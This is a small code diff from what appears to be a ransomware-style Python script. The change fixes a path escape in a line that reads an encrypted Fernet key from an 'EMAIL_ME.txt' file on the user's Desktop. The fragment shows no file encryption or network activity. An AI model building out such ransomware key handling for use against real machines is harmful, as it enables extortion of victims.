@@ -12,7 +12,7 @@ sysRoot = os.path.expanduser('~')
 desktop = f"{sysRoot}\\Desktop"
 print(sysRoot)
 
-with open(f'{DESKTOP_PATH}\{PROJECT_NAME}\\EMAIL_ME.txt', 'rb') as f:
+with open(f'{DESKTOP_PATH}\\{PROJECT_NAME}\\EMAIL_ME.txt', 'rb') as f:
     enc_fernet_key = f.read()
     print(enc_fernet_key)
 
